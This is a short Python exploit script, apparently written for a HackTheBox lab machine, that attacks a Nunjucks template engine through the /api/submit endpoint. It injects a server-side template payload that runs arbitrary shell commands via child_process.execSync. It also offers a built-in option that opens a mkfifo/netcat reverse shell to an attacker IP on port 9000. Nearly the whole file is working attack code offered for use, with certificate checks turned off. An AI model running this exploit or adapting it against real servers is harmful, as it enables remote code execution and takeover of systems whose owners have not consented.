#!/usr/bin/env python3

import requests, sys
from ast import literal_eval
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def postReq(url, api, data):
	print("[+] Sending request.")
	try:
		s = requests.Session()
		r = s.post(url + api, json=data, verify=False)
	except:
		print("[-] Server could not be reached.")
		print("[-] Exiting.")
		sys.exit(1)
	print("[+] Received response.")
	return r.text


def parseRes(res):
	print("[+] Parsing response.")
	try:
		return literal_eval(res)['response'][57:]
	except:
		print(res)
		print("[-] Error occured while parsing response.")
		print("[-] Exiting.")
		sys.exit(1)


def main():
	if len(sys.argv) != 2:
		print(f'Usage: {sys.argv[0]} <PAYLOAD>		-> type <revshell> to get a reverse shell on port 9000')
		print('Exiting')
		sys.exit(1)

	url = "https://store.nunchucks.htb"
	api = "/api/submit"
	if sys.argv[1] == "revshell":
		cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.2 9000 >/tmp/f'
	else:
		cmd = sys.argv[1]

	payload = f"range.constructor(\"return global.process.mainModule.require('child_process').execSync('{cmd}')\")()"

	data = {
		"email":f"{{{{ {payload} }}}}"
	}

	res = postReq(url, api, data)
	final = parseRes(res)
	print(f"Result: {final}")


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("[-] Goodbye!")
		sys.exit(1)
